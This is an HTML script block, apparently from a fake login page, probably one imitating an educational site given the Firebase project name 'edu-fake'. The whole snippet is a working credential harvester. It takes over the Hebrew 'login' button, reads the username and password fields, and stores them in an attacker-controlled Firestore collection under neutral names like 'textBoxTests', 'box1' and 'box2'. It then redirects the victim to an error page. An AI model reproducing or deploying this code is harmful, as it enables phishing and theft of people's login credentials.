<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
  import { getFirestore, collection, addDoc } from
    "https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBemjpiNu_vnrzen4V_3hNBRSb5QXxOtWk",
    authDomain: "edu-fake.firebaseapp.com",
    projectId: "edu-fake",
    storageBucket: "edu-fake.firebasestorage.app",
    messagingSenderId: "194855849760",
    appId: "1:194855849760:web:eec8071c34cb0b21399145"
  };

  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  document.addEventListener("DOMContentLoaded", () => {
    const button = [...document.querySelectorAll("button")]
      .find(b => b.textContent.trim() === "כניסה");

    if (!button) return;

    button.addEventListener("click", async (e) => {
      e.preventDefault();
      e.stopPropagation();

      const value1 = document.getElementById("userName")?.value || "";
      const value2 = document.getElementById("password")?.value || "";

      try {
        await addDoc(collection(db, "textBoxTests"), {
          box1: value1,
          box2: value2,
          time: new Date()
        });

        console.log("✅ נשלח ל‑Firebase");

        // מעבר ל‑hello.html
        window.location.href = "error.html";

      } catch (err) {
        console.error("שגיאה בשליחה ל‑Firebase:", err);
      }
    }, true);
  });
</script>
